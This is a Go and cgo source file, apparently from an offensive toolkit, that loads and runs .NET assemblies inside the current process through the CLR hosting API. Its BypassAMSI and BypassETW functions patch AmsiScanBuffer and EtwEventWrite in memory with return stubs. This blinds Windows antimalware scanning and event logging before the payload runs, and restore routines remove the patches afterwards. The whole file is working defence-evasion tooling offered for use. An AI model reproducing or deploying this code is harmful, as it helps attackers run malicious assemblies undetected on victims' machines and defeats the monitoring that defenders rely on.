//go:build windows && amd64

package dotnet

/*
#cgo CFLAGS: -O2
#include <windows.h>
#include <stdio.h>

// load_clr 加载 .NET CLR 并执行程序集。
// 使用 CLR Hosting API: CLRCreateInstance → ICLRMetaHost → ICLRRuntimeHost → ExecuteInDefaultAppDomain
int load_and_execute(const wchar_t* assemblyPath, const wchar_t* className,
                     const wchar_t* methodName, const wchar_t* args, int* exitCode) {
    HRESULT hr;

    // 1. 加载 mscoree.dll
    HMODULE hMod = LoadLibraryW(L"mscoree.dll");
    if (!hMod) return -1;

    // 2. 获取 CLRCreateInstance
    typedef HRESULT (WINAPI *CLRCreateInstanceFunc)(REFCLSID, REFIID, LPVOID*);
    CLRCreateInstanceFunc pCLRCreateInstance = (CLRCreateInstanceFunc)GetProcAddress(hMod, "CLRCreateInstance");
    if (!pCLRCreateInstance) {
        FreeLibrary(hMod);
        return -2;
    }

    // 3. CLRCreateInstance(&CLSID_CLRMetaHost, IID_ICLRMetaHost, &pMetaHost)
    IUnknown* pMetaHost = NULL;
    CLSID clsidMetaHost = {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
    IID iidUnknown = {0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

    hr = pCLRCreateInstance(&clsidMetaHost, &iidUnknown, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        FreeLibrary(hMod);
        return -3;
    }

    // 简化实现：使用 mscoree.dll 的 CorBindToRuntime
    typedef HRESULT (WINAPI *CorBindToRuntimeFunc)(LPCWSTR, LPCWSTR, REFCLSID, REFIID, LPVOID*);
    CorBindToRuntimeFunc pCorBindToRuntime = (CorBindToRuntimeFunc)GetProcAddress(hMod, "CorBindToRuntime");
    if (!pCorBindToRuntime) {
        pMetaHost->lpVtbl->Release(pMetaHost);
        FreeLibrary(hMod);
        return -4;
    }

    CLSID clsidRuntimeHost = {0x9065597E, 0xD1A1, 0x4fb2, {0xB6, 0xBA, 0x7E, 0x1F, 0xCE, 0x23, 0x0F, 0x61}};
    IID iidRuntimeHost = {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x61, 0x31}};

    IUnknown* pRuntimeHost = NULL;
    hr = pCorBindToRuntime(NULL, NULL, &clsidRuntimeHost, &iidRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) {
        pMetaHost->lpVtbl->Release(pMetaHost);
        FreeLibrary(hMod);
        return -5;
    }

    // 4. ICLRRuntimeHost::Start()
    // ICLRRuntimeHost vtable: Start is index 3
    typedef struct {
        IUnknown iface;
        HRESULT (WINAPI *Start)(IUnknown*);
        HRESULT (WINAPI *Stop)(IUnknown*);
        HRESULT (WINAPI *SetHostControl)(IUnknown*, IUnknown*);
        HRESULT (WINAPI *GetCLRControl)(IUnknown*, IUnknown**);
        HRESULT (WINAPI *UnloadAppDomain)(IUnknown*);
        HRESULT (WINAPI *ExecuteInAppDomain)(IUnknown*, DWORD, int*);
        HRESULT (WINAPI *ExecuteInDefaultAppDomain)(IUnknown*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD*);
    } ICLRRuntimeHostVtbl;

    ICLRRuntimeHostVtbl* vtable = *(ICLRRuntimeHostVtbl**)&pRuntimeHost;
    hr = vtable->Start(pRuntimeHost);
    if (FAILED(hr)) {
        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
        pMetaHost->lpVtbl->Release(pMetaHost);
        FreeLibrary(hMod);
        return -6;
    }

    // 5. ExecuteInDefaultAppDomain
    hr = vtable->ExecuteInDefaultAppDomain(pRuntimeHost, assemblyPath, className, methodName, args, (DWORD*)exitCode);

    vtable->Stop(pRuntimeHost);
    pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    pMetaHost->lpVtbl->Release(pMetaHost);
    // NOTE: Do NOT FreeLibrary(hMod) -- the CLR runtime keeps internal
    // references to mscoree.dll. Unloading it corrupts future CLR calls.

    if (FAILED(hr)) return -7;
    return 0;
}
*/
import "C"
import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	amsiPatched bool
	etwPatched  bool
	patchMu     sync.Mutex
)

// ptrFromUintptr converts a uintptr to unsafe.Pointer.
// Safe when the uintptr is a valid memory address from LazyProc.Addr().
//
//go:nosplit
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}

// ExecuteInProcess 在当前进程中加载并执行 .NET 程序集。
func ExecuteInProcess(config *AssemblyConfig) (*AssemblyResult, error) {
	startTime := time.Now()

	assemblyPath, err := syscall.UTF16PtrFromString(config.AssemblyPath)
	if err != nil {
		return nil, fmt.Errorf("invalid assembly path: %w", err)
	}
	var classNamePtr *uint16
	if config.ClassName != "" {
		classNamePtr, err = syscall.UTF16PtrFromString(config.ClassName)
		if err != nil {
			return nil, fmt.Errorf("invalid class name: %w", err)
		}
	} else {
		classNamePtr, _ = syscall.UTF16PtrFromString("Program")
	}
	var methodNamePtr *uint16
	if config.MethodName != "" {
		methodNamePtr, err = syscall.UTF16PtrFromString(config.MethodName)
		if err != nil {
			return nil, fmt.Errorf("invalid method name: %w", err)
		}
	} else {
		methodNamePtr, _ = syscall.UTF16PtrFromString("Main")
	}
	argsStr := ""
	if len(config.Args) > 0 {
		for _, a := range config.Args {
			if argsStr != "" {
				argsStr += " "
			}
			// Quote args containing spaces to prevent parsing issues
			if strings.ContainsAny(a, " \"\t") {
				argsStr += `"` + strings.ReplaceAll(a, `"`, `""`) + `"`
			} else {
				argsStr += a
			}
		}
	}
	argsPtr, err := syscall.UTF16PtrFromString(argsStr)
	if err != nil {
		return nil, fmt.Errorf("invalid args: %w", err)
	}

	var exitCode int
	ret := C.load_and_execute(
		(*C.wchar_t)(unsafe.Pointer(assemblyPath)),
		(*C.wchar_t)(unsafe.Pointer(classNamePtr)),
		(*C.wchar_t)(unsafe.Pointer(methodNamePtr)),
		(*C.wchar_t)(unsafe.Pointer(argsPtr)),
		(*C.int)(unsafe.Pointer(&exitCode)),
	)

	duration := time.Since(startTime).String()

	if ret != 0 {
		return &AssemblyResult{
			ExitCode: int(ret),
			Duration: duration,
		}, fmt.Errorf("CLR execution failed: code=%d", int(ret))
	}

	return &AssemblyResult{
		ExitCode: exitCode,
		Duration: duration,
	}, nil
}

// ExecuteOutProcess 创建新进程执行 .NET 程序集。
func ExecuteOutProcess(config *AssemblyConfig) (*AssemblyResult, error) {
	startTime := time.Now()

	// 使用 dotnet exec 方式执行
	cmdLine := fmt.Sprintf("dotnet exec %q", config.AssemblyPath)
	if len(config.Args) > 0 {
		for _, a := range config.Args {
			cmdLine += " " + a
		}
	}

	cmdPtr, err := syscall.UTF16FromString(cmdLine)
	if err != nil {
		return nil, fmt.Errorf("invalid command line: %w", err)
	}
	si := &windows.StartupInfo{
		Cb: uint32(unsafe.Sizeof(windows.StartupInfo{})),
	}
	var pi windows.ProcessInformation

	createProc := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessW")
	r, _, err := createProc.Call(
		0,
		uintptr(unsafe.Pointer(&cmdPtr[0])),
		0, 0,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CreateProcess: %w", err)
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// 等待进程结束
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)

	var exitCode uint32
	windows.GetExitCodeProcess(pi.Process, &exitCode)

	duration := time.Since(startTime).String()

	return &AssemblyResult{
		ExitCode: int(exitCode),
		Duration: duration,
	}, nil
}

// BypassAMSI 在执行 .NET 程序集前绕过 AMSI。
func BypassAMSI() (*AMSIContext, error) {
	amsi := syscall.NewLazyDLL("amsi.dll")
	procAmsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
	amsiPtr := ptrFromUintptr(procAmsiScanBuffer.Addr())

	if amsiPtr == nil {
		return nil, fmt.Errorf("failed to get AmsiScanBuffer address")
	}

	// 保存原始字节
	original := make([]byte, 6)
	src := unsafe.Slice((*byte)(amsiPtr), 6)
	copy(original, src)

	// Patch: mov eax, 0x80070057; ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	// VirtualProtect → RW
	var oldProtect uint32
	if err := windows.VirtualProtect(
		uintptr(amsiPtr),
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	); err != nil {
		return nil, fmt.Errorf("VirtualProtect AMSI: %w", err)
	}

	copy(src, patch)

	// VirtualProtect → RX
	if err := windows.VirtualProtect(
		uintptr(amsiPtr),
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	); err != nil {
		return nil, fmt.Errorf("VirtualProtect restore AMSI: %w", err)
	}

	return &AMSIContext{
		AmsiScanBufferAddr: uintptr(amsiPtr),
		PatchBytes:         patch,
		OriginalBytes:      original,
	}, nil
}

// BypassETW 在执行 .NET 程序集前绕过 ETW。
func BypassETW() (*ETWContext, error) {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procEtwEventWrite := ntdll.NewProc("EtwEventWrite")
	etwPtr := ptrFromUintptr(procEtwEventWrite.Addr())

	if etwPtr == nil {
		return nil, fmt.Errorf("failed to get EtwEventWrite address")
	}

	// 保存原始字节
	original := make([]byte, 5)
	src := unsafe.Slice((*byte)(etwPtr), 5)
	copy(original, src)

	// Patch: xor eax, eax; ret
	patch := []byte{0x31, 0xC0, 0xC3, 0x90, 0x90}

	// VirtualProtect → RW
	var oldProtect uint32
	if err := windows.VirtualProtect(
		uintptr(etwPtr),
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	); err != nil {
		return nil, fmt.Errorf("VirtualProtect ETW: %w", err)
	}

	copy(src, patch)

	// VirtualProtect → RX
	if err := windows.VirtualProtect(
		uintptr(etwPtr),
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	); err != nil {
		return nil, fmt.Errorf("VirtualProtect restore ETW: %w", err)
	}

	return &ETWContext{
		EtwEventWriteAddr: uintptr(etwPtr),
		PatchBytes:        patch,
		OriginalBytes:     original,
	}, nil
}

// RestoreAMSI 恢复 AMSI 原始状态。
func (ctx *AMSIContext) Restore() error {
	if ctx.AmsiScanBufferAddr == 0 || len(ctx.OriginalBytes) == 0 {
		return fmt.Errorf("AMSI context is empty")
	}

	src := unsafe.Slice((*byte)(ptrFromUintptr(ctx.AmsiScanBufferAddr)), len(ctx.OriginalBytes))

	var oldProtect uint32
	windows.VirtualProtect(
		uintptr(ctx.AmsiScanBufferAddr),
		uintptr(len(ctx.OriginalBytes)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)

	copy(src, ctx.OriginalBytes)

	windows.VirtualProtect(
		uintptr(ctx.AmsiScanBufferAddr),
		uintptr(len(ctx.OriginalBytes)),
		oldProtect,
		&oldProtect,
	)

	return nil
}

// RestoreETW 恢复 ETW 原始状态。
func (ctx *ETWContext) Restore() error {
	if ctx.EtwEventWriteAddr == 0 || len(ctx.OriginalBytes) == 0 {
		return fmt.Errorf("ETW context is empty")
	}

	src := unsafe.Slice((*byte)(ptrFromUintptr(ctx.EtwEventWriteAddr)), len(ctx.OriginalBytes))

	var oldProtect uint32
	windows.VirtualProtect(
		uintptr(ctx.EtwEventWriteAddr),
		uintptr(len(ctx.OriginalBytes)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)

	copy(src, ctx.OriginalBytes)

	windows.VirtualProtect(
		uintptr(ctx.EtwEventWriteAddr),
		uintptr(len(ctx.OriginalBytes)),
		oldProtect,
		&oldProtect,
	)

	return nil
}
